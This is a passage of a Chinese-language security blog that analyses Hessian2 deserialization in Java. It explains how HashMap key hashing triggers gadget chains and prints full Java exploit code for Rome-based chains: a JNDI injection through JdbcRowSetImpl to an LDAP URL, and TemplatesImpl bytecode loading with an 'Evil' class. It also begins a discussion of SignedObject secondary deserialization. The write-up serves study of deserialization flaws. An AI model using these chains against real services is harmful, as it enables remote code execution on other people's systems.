<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    JdkDynamicAopProxy.invoke()</span><br><span class="line">                        AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>依赖版本</li>
</ol>
<blockquote>
<p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7(或低版本下的jdk1.8) 主要原因还是 AnnotationInvocationHandler  的问题，版本高了用不了</p>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java 反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Hessian2 反序列化</title>
    <url>/2023/05/20/blog_hessian2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="反序列化机制（了解即可）"><a href="#反序列化机制（了解即可）" class="headerlink" title="反序列化机制（了解即可）"></a>反序列化机制（了解即可）</h2><p>序列化&#x2F;反序列化机制分大体分为两类</p>
<ul>
<li>基于Bean属性访问机制</li>
<li>基于Field机制</li>
</ul>
<h3 id="基于Bean属性访问机制"><a href="#基于Bean属性访问机制" class="headerlink" title="基于Bean属性访问机制"></a>基于Bean属性访问机制</h3><p>它们最基本的区别是如何在对象上设置属性值，它们有共同点，也有自己独有的不同处理方式。有的通过反射自动调用<code>getter(xxx)</code>和<code>setter(xxx)</code>访问对象属性，有的还需要调用默认Constructor，有的处理器（指的上面列出来的那些）在反序列化对象时，如果类对象的某些方法还满足自己设定的某些要求，也会被自动调用。还有XMLDecoder这种能调用对象任意方法的处理器。有的处理器在支持多态特性时，例如某个对象的某个属性是Object、Interface、abstruct等类型，为了在反序列化时能完整恢复，需要写入具体的类型信息，这时候可以指定更多的类，在反序列化时也会自动调用具体类对象的某些方法来设置这些对象的属性值。</p>
<p>这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SnakeYAML</span><br><span class="line">jYAML</span><br><span class="line">YamlBeans</span><br><span class="line">Apache Flex BlazeDS</span><br><span class="line">Red5 IO AMF</span><br><span class="line">Jackson</span><br><span class="line">Fastjson</span><br><span class="line">Castor</span><br><span class="line">Java XMLDecoder</span><br><span class="line">…</span><br></pre></td></tr></table></figure></div>



<h3 id="基于Field机制"><a href="#基于Field机制" class="headerlink" title="基于Field机制"></a>基于Field机制</h3><p>基于Field机制的反序列化是通过特殊的native（方法或反射（最后也是使用了native方式）直接对Field进行赋值操作的机制，而不是通过getter、setter方式对属性赋值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java Serialization</span><br><span class="line">Kryo</span><br><span class="line">Hessian</span><br><span class="line">json-io</span><br><span class="line">XStream</span><br></pre></td></tr></table></figure></div>



<h2 id="Hessian2-序列化与反序列化简单测试"><a href="#Hessian2-序列化与反序列化简单测试" class="headerlink" title="Hessian2 序列化与反序列化简单测试"></a>Hessian2 序列化与反序列化简单测试</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>Person.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>Hessian_Test.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bas);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        System.out.println(<span class="string">&quot;java原生: &quot;</span>+bas.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian2: &quot;</span>+bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="number">18</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;Koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);</span><br><span class="line">        System.out.println((Person) deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208224543523.png"
                      alt="image-20230208224543523"
                ></p>
<p><strong>相较于原生的反序列化，Hessian反序列化占用空间更小。</strong></p>
<h1 id="Hessian2-反序列化漏洞分析"><a href="#Hessian2-反序列化漏洞分析" class="headerlink" title="Hessian2 反序列化漏洞分析"></a>Hessian2 反序列化漏洞分析</h1><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208225258972.png"
                      alt="image-20230208225258972"
                ></p>
<p><code>HessianInput#readObject</code>部分代码如下,由于第一个每次都是77，所以都会进入该部分，在这获取了type</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208225728424.png"
                      alt="image-20230208225728424"
                ></p>
<p>接着会进入<code>ObjectInputStream#readMap</code>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span> <span class="keyword">throws</span> HessianProtocolException, IOException &#123;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.getDeserializer(type);</span><br><span class="line">        <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> deserializer.readMap(in);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._hashMapDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>._hashMapDeserializer.readMap(in);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>._hashMapDeserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(HashMap.class);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>._hashMapDeserializer.readMap(in);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 getDeserializer 方法中，主要的操作就是首先判断了type是否为null，然后通过这个type去默认的map中获取deserializer，最开始肯定是没有我们这个类的type的，可以看看默认有些啥，当然显然是不会有的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208231744002.png"
                      alt="image-20230208231744002"
                ></p>
<p>然后判断是否为数组类型，显然我们本例不是，若是，则按数组进行处理。</p>
<p>最后上面的都不满足，则获取class，再进入<code>this.getDeserializer(Class)</code>再获取该类对应的Deserializer，这里是进入这里</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="built_in">this</span>.loadSerializedClass(type);</span><br><span class="line">                    deserializer = <span class="built_in">this</span>.getDeserializer(cl);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></div>

<p>具体 <code>this.getDeserializer(Class)</code> 是怎么获取的就不去解析了，主要看紧接着的内容。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>._cachedTypeDeserializerMap == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>._cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="built_in">this</span>._cachedTypeDeserializerMap) &#123;</span><br><span class="line">                    <span class="built_in">this</span>._cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>大概目的就是在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入一个HashMap中。这里既然使用了HashMap的put方法，那么key的hashcode的方法就会被执行。这就是一个漏洞点。所以不同于我们以前默认的反序列化，这个 Hessian2 我们不是利用被序列化类的 readobject 方法，而是hashcode方法。</p>
<h2 id="归纳"><a href="#归纳" class="headerlink" title="归纳"></a>归纳</h2><p>Hessian 提供了一个 <code>_isAllowNonSerializable</code> 变量用来打破序列化类需要实现序列化接口的规范，可以使用 <code>SerializerFactory#setAllowNonSerializable</code> 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化，换句话说，Hessian 实际支持反序列化任意类，无需实现 Serializable 接口。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><strong>Hessian 对 Map 类型数据的处理上，<code>MapDeserializer#readMap</code> 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。而众所周知， HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651123884314.png"
                      alt="img"
                ></p>
<p><strong>而 TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651213661427.png"
                      alt="img"
                ></p>
</blockquote>
<p><strong>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</strong></p>
<ul>
<li><strong>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</strong></li>
<li><strong>利用链中调用的成员变量不能为 transient 修饰；（后面rome演示）</strong></li>
<li><strong>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</strong></li>
</ul>
<p>这几个限制也导致了很多 Java 原生反序列化利用链在 Hessian 中无法使用，有些链子中一些明明是 hashCode&#x2F;equals&#x2F;compareTo 触发的链子都不能直接拿来用。</p>
<h1 id="Rome-配合-Hessian2"><a href="#Rome-配合-Hessian2" class="headerlink" title="Rome 配合 Hessian2"></a>Rome 配合 Hessian2</h1><h2 id="打-jndi-注入"><a href="#打-jndi-注入" class="headerlink" title="打 jndi 注入"></a>打 jndi 注入</h2><p>这个在学Rome的时候没学到过，这里记录一下，实际上就 ToStringBean 会遍历所有无参getter 和setter，我们设置的JdbcRowSetImpl 类会去触发 getDatabaseMetaData ，从而触发jndi注入。不做过多解释（由于打jndi需要出网，一般情况下认为限制比较大）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_jndi</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/w1lfvn&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;hello! koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setValue(equalsBean,<span class="string">&quot;_beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line">        setValue(equalsBean,<span class="string">&quot;_obj&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos);</span><br><span class="line">        hot.writeObject(hashMap);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="🚩加载字节码（二次反序列化）"><a href="#🚩加载字节码（二次反序列化）" class="headerlink" title="🚩加载字节码（二次反序列化）"></a>🚩加载字节码（二次反序列化）</h2><p><strong>既然说到了hashcode方法，显然很容易想到Rome中的一个利用方式。（CC6好像也用的hashcode方法，后面研究研究看看。）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure></div>

<p><strong>使用 EqualsBean 变式去触发</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//必须修改_bytecodes</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class,templates);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,templates);</span><br><span class="line">        hashMap.put(bean,bean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_beanClass&quot;</span>,ObjectBean.class);</span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_obj&quot;</span>,objectBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos);</span><br><span class="line">        hot.writeObject(hashMap);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是在调试的时候，发现存在问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230209164320207.png"
                      alt="image-20230209164320207"
                ></p>
<p>到 defineTransletClasses 方法处，_tfactory 值为null，而我们此时又恰好为 java8，是需要该属性的。</p>
<p>这是因为<code>_tfactory</code>是一个transient修饰的属性，不会被反序列化。而在原生反序列化时，该属性是在<code>TemplatesImpl#readObject</code>中重新设置进去的。在hessian反序列化中读取属性时可以发现压根就没写入这个属性，导致空指针异常。</p>
<p><strong>原因是：在hessian序列化时，由 <code>UnsafeSerializer#introspect</code> 方法来获取对象中的字段，在老版本中应该是 <code>getFieldMap</code> 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/107563321d94b95289886d9d7f615782.png"
                      alt="image-20230202015021051"
                ></p>
<p>因此我们需要寻找向序列化流里面写入数据或者改变流内容的类。</p>
<h3 id="java-security-SignedObject"><a href="#java-security-SignedObject" class="headerlink" title="java.security.SignedObject"></a>java.security.SignedObject</h3><p>这个类有个 getObject 方法会从流里使用原生反序列化读取数据。我们只需找到能触发任意get的方法就能触发二次反序列化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651139384898.png"
                      alt="img"
                ></p>
<p>这个 SignedObject 反序列化的内容也是可控的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/dae46fcd0fd2ce47170e48bd1ec65340.png"
                      alt="img"
                ></p>
<p>问题又来了，为什么原生反序列化就可以恢复这个<code>trasient</code>修饰的变量呢？</p>
<p>因为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject</code>,重写了readOBject方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/8.png"
                      alt="img"
                ></p>
<h3 id="获取-SignedObject-对象"><a href="#获取-SignedObject-对象" class="headerlink" title="获取 SignedObject 对象"></a>获取 SignedObject 对象</h3><p>由 SignedObject 构造器参数比较陌生，我这里写下几个获取的方法，获取SignedObject对象的方法有很多种</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>比如公开面最广的：</p>
